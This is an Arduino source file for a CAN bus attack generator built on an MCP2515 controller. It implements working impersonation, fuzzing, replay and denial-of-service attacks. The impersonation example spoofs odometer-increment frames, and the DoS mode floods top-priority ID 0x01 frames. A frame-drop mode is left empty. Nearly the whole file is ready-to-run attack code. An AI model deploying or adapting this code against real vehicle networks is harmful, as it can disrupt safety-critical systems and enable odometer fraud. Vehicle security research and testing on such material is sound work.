//
// Created by tompnyx on 01/09/2022.
//
#include "CANBusAttackGenerator.h"

#include <Arduino.h>
#include <mcp2515_can.h>

// CONSTANTS ==================================================================
// Sets the maximum payload size - CANFD can carry data up to 64 bytes, whereas
// CAN 2.0 can only carry up to 8 bytes
#define MAX_DATA_SIZE 8

// PUBLIC VARIABLES ===========================================================
// CAN_2515
const int SPI_CS_PIN = 10;
const int CAN_INT_PIN = 2;
// Set CS pin
mcp2515_can CAN(SPI_CS_PIN);
// The time the device started
unsigned long timeStart;
// The CAN ID to filter for (If equal to 0 it will be ignored)
unsigned long filterId = 0;
// The delay between sending messages. Values below 9 seem to cause issues.
int delaySize = 1000;

// The different operations that can be performed
enum Operation {Impersonation, Fuzzing, Replay, DoS, FrameDrop};
// Change op to set the operation mode
Operation op = DoS;


// ARDUINO FUNCTIONS ==========================================================

void setup() {
    SERIAL_PORT_MONITOR.begin(115200);
    // wait for Serial
    while (!SERIAL_PORT_MONITOR);
    // init can bus at a baudrate = 500k
    if (CAN_OK != CAN.begin(CAN_500KBPS)) {
        SERIAL_PORT_MONITOR.println("CAN init fail");
    } else {
        SERIAL_PORT_MONITOR.println("CAN init ok!");
    }
    // Initialises the seed randomly
    randomSeed(analogRead(0));
}

void loop() {
    // Runs the selected attack
    switch (op) {
        case Impersonation:
            impersonation();
            break;
        case Fuzzing:
            fuzzing();
            break;
        case Replay:
            replay();
            break;
        case DoS:
            dos();
            break;
        case FrameDrop:
            frameDrop();
            break;
    }
}

// ATTACKS ====================================================================

void impersonation() {
    // Impersonation Message details. An example of an odometer message is
    // given below.

    // The CAN id of the message.
    unsigned long impID = 0x4c0;
    // The CAN payload - The first bit being '1' signifies that the odometer
    // should be incremented
    unsigned char impPayload[8] = {0b00000001, 0, 0, 0, 0, 0, 0, 0};
    // The Extended Frame ID (Set to 0)
    byte impEXT = 0;
    // The Remote Request (RTR) Frame ID (Set to 0)
    byte impRTR = 0;
    // The length of the message in bytes (Set to 1)
    byte impLen = 1;

    while(true) {
        // Sends the CAN message
        send_can(impID, impEXT, impRTR, impLen, impPayload);

        // Delay if needed
        if (delaySize) {
            delay(delaySize);
        }
    }
}

void fuzzing() {
    // Generates a random CAN message and sends it
    send_can(true);
    // Delay if needed
    if (delaySize) {
        delay(delaySize);
    }
}

void replay() {
    // The number of times to repeat the message
    int numRepeat = 5;
    unsigned long id = 0;
    byte ext = 0;
    byte rtr = 0;
    unsigned char len = 0;
    unsigned char buf[MAX_DATA_SIZE];

    while (true) {
        do {
            // The variables of which the CAN message will be stored
            byte status = CAN.readRxTxStatus();
            // Read the CAN message
            CAN.readMsgBufID(status, &id, &ext, &rtr, &len, buf);
        } while (filterId == id || id == 0);

        // Sends the CAN message a number of times (determined by numRepeat)
        for (int i = 0; i < numRepeat; i++) {
            send_can(id, ext, rtr, len, buf);

            // Delay between message capture if needed
            if (delaySize) {
                delay(delaySize);
            }
        }
    }
}

void dos() {
    // Sends a CAN message with the CAN id of 0x01 repeatedly
    send_can(0x01, false, true);

    delay(7);
}

void frameDrop() {

}

// CREATE MESSAGES ============================================================

void generate_random_id(unsigned long &id, bool ext) {
    if (ext) {
        // An Extended Frame ID is now generated - which takes up to 29 bits.
        // As the Arduino AVR only generates up to 16-bit random numbers, a
        // second mask is applied to the first to generate a 29 bit random
        // number.
        id = random(0x1U << 14);
        id |= (uint32_t)random(0x1U << 15) << 14;
    } else {
        // A Standard Frame ID is now generated - which takes up to 11 bits.
        id = random(0x1U << 11);
    }
}

void generate_random_payload(byte &len, unsigned char *payload, bool ext,
                             bool rtr) {
    if (rtr) {
        // Here an RTR message is sent - so the payload has to be empty.
        len = 0;
    } else {
        // Here a normal message is randomly generated.
        // Remember the condition max in the function random is exclusive to
        // the upper bound.
#if MAX_DATA_SIZE > 8
        len = ext ? random(16) : random(9);
#else
        len = random(9);
#endif
    }

    // Populate the payload (message buffer) with random values.
    int i;
    for (i = 0; i < len; i++) {
        payload[i] = random(0x100);
    }
}

void generate_random_message(unsigned long &id,
                             byte &ext,
                             byte &rtr,
                             byte &len,
                             unsigned char *payload) {
    // Here a random number up to 4 is generated. The value of the bit
    // determines the value of ext and rtr.
    // ext is true if the zero bit - e.g., 0b0X - is populated.
    // rtr is true if the first bit - e.g., 0bX0 - is populated.
    // 3 = 0b11 -> ext = true,  rtr = true
    // 2 = 0b10 -> ext = false, rtr = true
    // 1 = 0b01 -> ext = true,  rtr = false
    // 0 = 0b00 -> ext = false, rtr = false
    long type = random(4);

    // Set values of EXT and RTR bit.

    // EXT is the type of frame that is generated. A EXT bit of 1 means the
    // message sent is an extended frame message, whereas a standard frame
    // would have  a bit of 0
    ext = type & 0x1;
    // RTR is the Remote Request Frame. It is a feature that sends empty
    // packages requesting data from the target ID. If a CAN extended message
    // is sent (which has a 29 bit identifier), the 11 most significant bits
    // change to the Substitute Remote Request (SRR).
    rtr = type & 0x2;

    // Generates a random CAN ID
    generate_random_id(id, ext);
    // Generates a random payload and sets length accordingly
    generate_random_payload(len, payload, ext, rtr);
}

// DISPLAY MESSAGES ===========================================================

void print_can_message_to_monitor(unsigned long canId,
                                  byte len,
                                  unsigned char *buf) {
    // Variables used to pad values to fit formatting
    char canIdString[9];
    char time[9];
    // Prints the timestamp to terminal
    SERIAL_PORT_MONITOR.print("Timestamp:\t");
    sprintf(time, "%08lu", millis() - timeStart);
    SERIAL_PORT_MONITOR.print(time);
    // Prints the CAN ID to terminal
    SERIAL_PORT_MONITOR.print("\tID:\t");
    sprintf(canIdString, "%08lx", canId);
    SERIAL_PORT_MONITOR.print(canIdString);
    // Prints the length of the message to terminal
    SERIAL_PORT_MONITOR.print("\tDLC:\t");
    SERIAL_PORT_MONITOR.print(len);
    SERIAL_PORT_MONITOR.print("\t");
    // Prints the message to terminal
    for (int i = 0; i < len; i++) {
        char tmp[3];
        sprintf(tmp, "%.2x", buf[i]);
        SERIAL_PORT_MONITOR.print(tmp);
        SERIAL_PORT_MONITOR.print(" ");
    }
    SERIAL_PORT_MONITOR.println();
}

// SENDING AND RECEIVING ======================================================

bool check_message_sent(int report) {
    if (report == CAN_SENDMSGTIMEOUT) {
        // CAN_SENDMSGTIMEOUT: A timeout has occurred
        SERIAL_PORT_MONITOR.println("A CAN_SENDMSGTIMEOUT has occurred");
    } else if (report == CAN_GETTXBFTIMEOUT) {
        // CAN_GETTXBFTIMEOUT: The program has failed to get the next free
        // buffer. This has most likely occurred due to the buffer being full.
        SERIAL_PORT_MONITOR.println("A CAN_GETTXBFTIMEOUT has occurred");
    } else {
        // CAN_OK: everything is working
        return true;
    }
    return false;
}

void send_can(bool sendRandom) {
    unsigned char payload[MAX_DATA_SIZE] = {0};
    unsigned long id = 0x00;
    byte ext;
    byte rtr;
    // Make sure len is unsigned - unsigned bytes are native to c
    byte len;
    // The return value of sending the message
    int report;

    if (sendRandom) {
        generate_random_message(id, ext, rtr, len, payload);
        report = CAN.sendMsgBuf(id, ext, rtr, len, payload);
    } else {
        report = CAN.sendMsgBuf(0x00, 0, 0, 8, payload);
    }

    if (check_message_sent(report)) {
        SERIAL_PORT_MONITOR.print("Sent Message:\t");
        print_can_message_to_monitor(id, len, payload);
    }
}

void send_can(unsigned long id, bool ext_condition, bool rtr_condition) {
    unsigned char payload[MAX_DATA_SIZE] = {0};
    byte ext = (ext_condition) ? 1 : 0;
    byte rtr = (rtr_condition) ? 1 : 0;
    // Make sure len is unsigned - unsigned bytes are native to c
    byte len;
    // The return value of sending the message
    int report;

    generate_random_payload(len, payload, ext, rtr);
    report = CAN.sendMsgBuf(id, ext, rtr, len, payload);

    if (check_message_sent(report)) {
        SERIAL_PORT_MONITOR.print("Sent Message:\t");
        print_can_message_to_monitor(id, len, payload);
    }
}

void send_can(unsigned long id, byte ext, byte rtr, byte len,
              unsigned char *payload) {
    // The return value of sending the message
    int report;

    // Sends the CAN message. Report contains the return code.
    report = CAN.sendMsgBuf(id, ext, rtr, len, payload);

    // Check to see if the message was sent successfully
    if (check_message_sent(report)) {
        SERIAL_PORT_MONITOR.print("Sent Message:\t");
        print_can_message_to_monitor(id, len, payload);
    }
}